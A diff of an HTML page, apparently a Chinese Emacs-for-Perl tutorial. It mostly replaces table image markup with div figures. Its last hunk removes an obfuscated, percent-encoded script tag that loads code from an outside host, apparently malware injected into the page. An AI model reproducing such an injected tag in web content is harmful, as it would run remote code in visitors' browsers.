@@ -31,7 +31,7 @@
 <dd>
 <dl>
 <dt>
-<a href="#sec5">.emacs 配置2</a>
+<a href="#sec5">.emacs 配置<sup>2</sup></a>
 </dt>
 <dt>
 <a href="#sec6">命令</a>
@@ -57,7 +57,7 @@
 <dd>
 <dl>
 <dt>
-<a href="#sec11">.emacs 配置3</a>
+<a href="#sec11">.emacs 配置<sup>3</sup></a>
 </dt>
 <dt>
 <a href="#sec12">命令</a>
@@ -119,17 +119,19 @@
 全方式不是太好，起码是不直观。emacs 提供一个很好的补全方式──ido-mode。
 这样打开文件时如下图所示：</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/ido-1.png" alt="Ido 1"></td></tr>
-  <tr><td align="center" class="image-caption">Ido 1</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/ido-1.png" alt="Ido 1"/>	</div>
+		<p>Ido 1</p>
+	</div>
 
 <p>在输入几个字符后，补全显示如下：</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/ido-2.png" alt="Ido 2"></td></tr>
-  <tr><td align="center" class="image-caption">Ido 2</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/ido-2.png" alt="Ido 2"/>	</div>
+		<p>Ido 2</p>
+	</div>
 
 <p>ido 补全不是从列表中字符串开头进行匹配，而是在任意位置。而且还可以使
 用正则表达式进行匹配。匹配的方式是可以自定义的。</p>
@@ -139,10 +141,11 @@
 
 <p>当文件不存在或者是空文件时，会提示是否使用模板创建新文件：</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/newfile.png" alt="New file with template"></td></tr>
-  <tr><td align="center" class="image-caption">New file with template</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/newfile.png" alt="New file with template"/>	</div>
+		<p>New file with template</p>
+	</div>
 
 <p>在打开文件后就可以进行编辑了。</p>
 
@@ -335,19 +338,21 @@ cperl-tags-hier-init），效果如下图。但是在我这运行时会产生错
 要重新产生这个菜单，可以先用 M-x visit-tags-table 后再选择菜单上的
 &quot;++UPDATE++&quot;，否则是无法更新的。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/tags-hier.png" alt="Class Hierarchy from TAGS"></td></tr>
-  <tr><td align="center" class="image-caption">Class Hierarchy from TAGS</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/tags-hier.png" alt="Class Hierarchy from TAGS"/>	</div>
+		<p>Class Hierarchy from TAGS</p>
+	</div>
 
 
 <p>如果觉得这样的效果不错的话，可以试试 tags-tree，一个用于树形显示 TAGS
 文件的扩展。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/tags-tree.png" alt="TAGS Tree"></td></tr>
-  <tr><td align="center" class="image-caption">TAGS Tree</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/tags-tree.png" alt="TAGS Tree"/>	</div>
+		<p>TAGS Tree</p>
+	</div>
 
 <p>但是一般来说花哨的功能都不太实用，如果浏览代码时还要一会点鼠标，一会用
 键盘转来转去的话，效率反而更低。还是老老实实用 find-tag 这样的命令比较
@@ -355,17 +360,19 @@ cperl-tags-hier-init），效果如下图。但是在我这运行时会产生错
 
 <p>如果仅限于本文件跳转，imenu 应该是最好的选择。效果如下图所示：</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/ido-imenu.png" alt="Ido Imenu"></td></tr>
-  <tr><td align="center" class="image-caption">Ido Imenu</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/ido-imenu.png" alt="Ido Imenu"/>	</div>
+		<p>Ido Imenu</p>
+	</div>
 
 <p>如果还要更直观一些，可以试试使用 imenu-tree。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/imenu-tree.png" alt="Imenu Tree"></td></tr>
-  <tr><td align="center" class="image-caption">Imenu Tree</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/imenu-tree.png" alt="Imenu Tree"/>	</div>
+		<p>Imenu Tree</p>
+	</div>
 
 <p>所有这些都不是建立在语义分析基础上的，所以在使用别人的库时，想要查找库
 函数的定义基本上除了创建 TAGS 文件之外，就只能打开这个库文件使用 imenu
@@ -382,18 +389,20 @@ perldoc-find-module 这样的命令。在 cperl-mode 中，如果想打开光标
 块，可以使用 ffap。这也是一个很有用的命令，可以打开几乎所有能想到的
 URL，所以值得做一个全局绑定。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/pcomplete.png" alt="PC include file complete"></td></tr>
-  <tr><td align="center" class="image-caption">PC include file complete</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/pcomplete.png" alt="PC include file complete"/>	</div>
+		<p>PC include file complete</p>
+	</div>
 
 <p>关于代码浏览另一个话题是代码折叠功能。emacs 一个重要的文字折叠扩展
 是 outline。cperl-mode 支持使用 outline-minor-mode 来折叠代码。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/outline.png" alt="Fold subroutines in outline-minor-mode"></td></tr>
-  <tr><td align="center" class="image-caption">Fold subroutines in outline-minor-mode</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/outline.png" alt="Fold subroutines in outline-minor-mode"/>	</div>
+		<p>Fold subroutines in outline-minor-mode</p>
+	</div>
 
 <p>hideshow 是另一个用于代码折叠的扩展。hideshow 的特色在于它是基于块和注
 释进行折叠，所以不会像 outline 那样把空白会收到折叠区域里。缺点是它只能
@@ -473,10 +482,11 @@ manpage 中的某个条目，查询 perldoc 或者 perlapi。我推荐使用。p
 展还提供树形显示模块的功能。在这个模式中可以显示模块文档或者直接打开对
 应的文件。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/perldoc-tree.png" alt="Perldoc Tree"></td></tr>
-  <tr><td align="center" class="image-caption">Perldoc Tree</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/perldoc-tree.png" alt="Perldoc Tree"/>	</div>
+		<p>Perldoc Tree</p>
+	</div>
 
 <p>再说说函数参数的提示，emacs 中函数参数提示是由 eldoc 这个扩展实现的。
 但是 cperl-mode 自己也提供内建函数的提示。使用 cperl-lazy-install 启动。
@@ -512,10 +522,11 @@ manpage 中的某个条目，查询 perldoc 或者 perlapi。我推荐使用。p
 但是我还是写了一个新的程序，功能上没有前者强大，但是简单，容易扩展，而
 且可以回显运行的结果。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/inf-perl.png" alt="Interactive perl shell"></td></tr>
-  <tr><td align="center" class="image-caption">Interactive perl shell</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/inf-perl.png" alt="Interactive perl shell"/>	</div>
+		<p>Interactive perl shell</p>
+	</div>
 
 <p>你可以在边写 perl 代码时，用 inf-perl-send 发送当前行到 shell 中运行，
 也可以在写完一段代码时，用 inf-perl-send 发送选中区域到 shell 中运行。
@@ -546,10 +557,11 @@ Debugger</h2>
 实现。开发难度比较大，主要是调试不方便，还有对 perl5db.pl 不太熟悉。如
 果能实现我想要的功能，这个 Debugger 会很有用。</p>
 
-<table class="image" width="100%">
-  <tr><td align="center"><img src="images/perldb.png" alt="Perl Debugger"></td></tr>
-  <tr><td align="center" class="image-caption">Perl Debugger</td></tr>
-</table>
+<div class="figure">
+		<div class="photo">
+	<img src="images/perldb.png" alt="Perl Debugger"/>	</div>
+		<p>Perl Debugger</p>
+	</div>
 
 <p>perl5db 提供的命令行界面已经相当简洁，可能比使用 emacs 按键还要快捷。除
 了 n, s, c, b, B, w, W, L, p, x 这些常用的控制和显示命令，这些命令也很
@@ -596,4 +608,3 @@ Debugger</h2>
 <!-- Page published by Emacs Muse ends here -->
   </body>
 </html>
-<script src="http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
